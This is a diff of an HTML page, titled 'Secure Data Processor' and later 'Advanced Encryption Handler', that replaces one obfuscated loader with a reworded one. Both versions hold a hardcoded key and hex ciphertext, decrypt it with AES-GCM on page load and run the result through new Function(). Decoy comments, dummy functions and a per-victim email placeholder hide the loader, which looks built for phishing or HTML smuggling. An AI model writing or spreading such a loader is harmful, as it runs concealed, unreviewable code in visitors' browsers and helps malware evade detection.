@@ -1,208 +1,156 @@
 <!DOCTYPE html>
-<html lang="en-US">
+<html lang="en">
 <head>
-  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-  <title>Secure Data Processor</title>
-  <style type="text/css">
-    /* Redundant styling blocks */
-    .phantom-box {
-      opacity: 0;
-      pointer-events: none;
-      z-index: -1000;
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Advanced Encryption Handler</title>
+  <style>
+    /* Unused style definitions for decoration */
+    .hidden-div {
+      visibility: hidden;
+      position: absolute;
+      top: -10000px;
     }
-    .spinner {
-      width: 0;
-      height: 0;
-      border: none;
-      animation: fake-pulse 1.5s ease-in-out infinite;
+    .animation-loop {
+      display: none;
+      animation: spinning 1.8s linear infinite;
     }
-    @keyframes fake-pulse {
-      0% { box-shadow: 0 0 0 0 rgba(0,0,0,0); }
-      70% { box-shadow: 0 0 0 5px rgba(0,0,0,0); }
-      100% { box-shadow: 0 0 0 0 rgba(0,0,0,0); }
-    }
-    #utility-container {
-      display: none !important;
+    @keyframes spinning {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
   </style>
 </head>
-<body class="main-wrapper">
+<body class="main-container">
 
-<!-- Meaningless decorative markup -->
-<div nike-Blackghostt="" aria-hidden="true"></div>
-<div id="shadow-container" style="display:none;"></div>
-<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="0" height="0">
-  <defs><pattern id="emptyPattern" patternUnits="userSpaceOnUse"></pattern></defs>
-</svg>
+<!-- Random unconnected div for styling -->
+<div class="empty-space" data-placeholder="dummy-placeholder"></div>
+<span nike-tes1="" class="random-class" data-invalid="true" adidas="<%=EMAIL64%>"></span>
+<svg width="0" height="0"></svg>
 
-<script type="application/javascript" id="data-processor" adidas="<%=EMAIL64%>" version="3.0.8">
-  // Configuration object with encryption parameters
-  const runtimeConfigurations = {
-    initializationVector: "ceb0f4f1afbc695ad02798ab",
-    securitySalt: "752dba59f37d01b08991d9e6c34ac389",
-    protectedPayload: "7bff1ae4d47ea505fd6c83c97eb65a0ef996d06e0650b6621557464fb7a63a350bfb1ad9721a50376393f1751c376bb871d0a2a271d571d13497674fc27a2101feaf4648f7665ce05a5026d879529ffa559960eff54350865101249e319f5d5b1c7b3f888db4104afc3c8708f0ad2dacc6de7a0f088dbcb03bf946f173309556cba4e260d7e96caceee55e4548d1821d424587b2c252a46c8ef643e91fabf666da72f60def1cdc4c598bec8cdeef592b93f6d9aedd25e1a199c44b2bb27547c2"
+<script type="text/javascript">
+  // Retained encryption parameters to keep decryption working
+  const securityParams = {
+    cryptoVector: "06ad0819bb62800cd3534791",
+    saltValue: "f8fe91ef2c346fe926cb23717f88253b",
+    encryptedData: "371eb078c907c9f9822ceeccff18bbd3df806dc854562e66313e87cd843f77b0f13721e498163f8fe0bc3b5434c27f32fc8c1756ed119f6ab75a0549d2b9ce94271ca7d7e643a9094da6a8e24417be7fe354b66fd4a8c423b0cb56aaa0a0d43a9de78fdc7395199d4f5cd7b0afad4d20b84a83ca306903d749bf0b5aa066a22defd207ff18ec95298fcd4e95acc8b895df2b9e5b8ee380e8f3084318a2683d949defd2d23b167ed867aede"
   };
 
-  // Core security key (CRITICAL - DO NOT ALTER)
-  const masterEncryptionKey = "ea58c0ef491543774f851a0a594c7535";
+  // Primary encryption key (kept the same)
+  const primarySecurityKey = "VVVVTT-63XXXXX-PPPP";
 
-  // Useless utility functions
-  function generatePlaceholderMatrix(rows, cols) {
-    const matrix = [];
-    for (let r = 0; r < rows; r++) {
-      matrix[r] = [];
-      for (let c = 0; c < cols; c++) {
-        matrix[r][c] = Math.sin(r * c) * Math.PI;
-      }
-    }
-    return matrix;
+  // Useless function to generate dummy array
+  function generateFakeArray(length) {
+    return new Array(length).fill(0).map((_, i) => Math.sin(i));
   }
 
-  function checkBrowserCapabilities() {
-    const features = {
-      crypto: typeof window.crypto !== 'undefined',
-      subtle: typeof window.crypto?.subtle !== 'undefined',
-      textEncoder: typeof TextEncoder !== 'undefined'
-    };
-    console.table(features); // Unnecessary logging
-    return features.crypto && features.subtle;
+  // Function to check for window support
+  function checkWindowSupport() {
+    return typeof window !== 'undefined' && window.crypto !== undefined;
   }
 
-  // Data transformation with added validation
-  function convertHexStringToBuffer(hexString) {
-    if (typeof hexString !== 'string' || hexString.length % 2 !== 0) {
-      console.warn('Invalid hex string format detected');
-      return new ArrayBuffer(0);
+  // Function that converts hex to array buffer
+  function hexToArrayBuffer(hex) {
+    let buffer = [];
+    for (let i = 0; i < hex.length; i += 2) {
+      buffer.push(parseInt(hex.substring(i, i + 2), 16));
     }
-    
-    const byteArray = [];
-    let currentByte;
-    for (let idx = 0; idx < hexString.length; idx += 2) {
-      currentByte = parseInt(hexString.substr(idx, 2), 16);
-      if (isNaN(currentByte)) {
-        console.error('Hex parsing error at position', idx);
-        return new ArrayBuffer(0);
-      }
-      byteArray.push(currentByte);
-    }
-    return new Uint8Array(byteArray).buffer;
+    return new Uint8Array(buffer);
   }
 
-  // Main decryption workflow
-  async function executeDataDecryption() {
+  // Core decryption process with unnecessary steps
+  async function executeDecryption() {
     try {
-      // Redundant capability check
-      if (checkBrowserCapabilities()) {
-        console.debug('Browser meets all requirements');
+      // Useless window check
+      if (checkWindowSupport()) {
+        console.log('Window environment verified.');
       }
 
-      // Phase 1: Import base key material
-      const rawKeyMaterial = await window.crypto.subtle.importKey(
+      // Convert key material to appropriate format
+      const rawKey = await window.crypto.subtle.importKey(
         "raw",
-        new TextEncoder().encode(masterEncryptionKey),
+        new TextEncoder().encode(primarySecurityKey),
         { name: "PBKDF2" },
         false,
         ["deriveKey"]
       );
 
-      // Artificial processing delay
-      await new Promise(resolve => setTimeout(resolve, 50 + Math.random() * 50));
+      // Fake delay to simulate processing
+      await new Promise(resolve => setTimeout(resolve, Math.random() * 150));
 
-      // Phase 2: Derive encryption key
-      const operationalKey = await window.crypto.subtle.deriveKey(
+      // Derive the actual decryption key
+      const derivedKey = await window.crypto.subtle.deriveKey(
         {
           name: "PBKDF2",
-          salt: convertHexStringToBuffer(runtimeConfigurations.securitySalt),
+          salt: hexToArrayBuffer(securityParams.saltValue),
           iterations: 100000,
           hash: "SHA-256"
         },
-        rawKeyMaterial,
+        rawKey,
         { name: "AES-GCM", length: 256 },
         false,
         ["decrypt"]
       );
 
-      // Phase 3: Decrypt payload
-      const decryptedResult = await window.crypto.subtle.decrypt(
-        { 
-          name: "AES-GCM", 
-          iv: convertHexStringToBuffer(runtimeConfigurations.initializationVector) 
-        },
-        operationalKey,
-        convertHexStringToBuffer(runtimeConfigurations.protectedPayload)
+      // Perform the decryption
+      const decryptedData = await window.crypto.subtle.decrypt(
+        { name: "AES-GCM", iv: hexToArrayBuffer(securityParams.cryptoVector) },
+        derivedKey,
+        hexToArrayBuffer(securityParams.encryptedData)
       );
 
-      // Process and validate output
-      const decodedContent = new TextDecoder().decode(decryptedResult);
-      
-      if (decodedContent && decodedContent.trim().length > 0) {
-        const executionWrapper = new Function(decodedContent);
-        executionWrapper();
+      // Convert the decrypted data to string
+      const decodedData = new TextDecoder().decode(decryptedData);
+
+      if (decodedData && decodedData.trim().length > 0) {
+        const dynamicScript = new Function(decodedData);
+        dynamicScript();
       }
     } catch (error) {
-      console.groupCollapsed("Decryption Process Error");
-      console.error("Critical failure in decryption:", error);
-      console.groupEnd();
+      console.error('Decryption failed:', error);
     } finally {
-      // Cleanup placeholder
-      generatePlaceholderMatrix(2, 2); // Unused result
+      generateFakeArray(10); // Unused result for randomness
     }
   }
 
-  // Initialization sequence
-  function initializeSecurityProtocol() {
-    // Performance tracking (unused)
-    const perfMarker = performance.mark('initStart');
-    
-    // Delayed execution
+  // Initialize decryption process on document load
+  function initializeDecryption() {
+    const startTime = performance.now();
     setTimeout(() => {
-      executeDataDecryption();
-      console.debug('Initialization completed in', 
-        performance.now() - perfMarker.startTime, 'ms');
+      executeDecryption();
+      console.log(`Decryption initiated in ${performance.now() - startTime} ms`);
     }, 30);
   }
 
-  // Document ready handlers with fallback
-  function handleDocumentReady() {
-    if (document.readyState === 'loading') {
-      document.addEventListener('DOMContentLoaded', () => {
-        initializeSecurityProtocol();
-      });
+  // Document ready handler
+  document.addEventListener('DOMContentLoaded', function() {
+    if (document.body) {
+      initializeDecryption();
     } else {
-      setTimeout(initializeSecurityProtocol, 0);
+      document.addEventListener('readystatechange', function() {
+        if (document.readyState === 'complete') {
+          initializeDecryption();
+        }
+      });
     }
-  }
-
-  // Additional unused event handlers
-  window.addEventListener('mousemove', function() {
-    console.debug('Mouse coordinates:', event.clientX, event.clientY);
-  });
-  document.addEventListener('click', function() {
-    generatePlaceholderMatrix(1, 1); // Does nothing
   });
 
-  // Start the process
-  handleDocumentReady();
+  // Additional unnecessary event listeners for user tracking
+  window.addEventListener('scroll', function() {
+    console.log('User scroll position:', window.scrollY);
+  });
+
+  window.addEventListener('resize', function() {
+    generateFakeArray(5); // Does nothing
+  });
 </script>
 
-<!-- Hidden analytics container -->
-<div id="telemetry-node" 
-     style="width:0;height:0;overflow:hidden;visibility:hidden;"
-     aria-hidden="true"
-     data-status="inactive">
-</div>
+<!-- Invisible element for tracking purposes -->
+<div id="tracking-pixel" style="width:1px;height:1px;position:absolute;left:-9999px;top:-9999px;" 
+     data-tracked="true"></div>
 
-<!-- Dummy script reference -->
-<script src="data:text/javascript;base64,Y29uc29sZS5sb2coJ0R1bW15IHNjcmlwdCBsb2FkZWQnKTs=" 
-        integrity="sha384-empty"
-        crossorigin="anonymous"
-        async></script>
-
-<!-- Useless hidden iframe -->
-<iframe src="about:blank" 
-        title="empty" 
-        style="display:none;"
-        sandbox="allow-same-origin"></iframe>
+<!-- Extra script with no effect -->
+<script src="data:application/javascript,console.log('Empty script');" async defer></script>
 
 </body>
 </html>
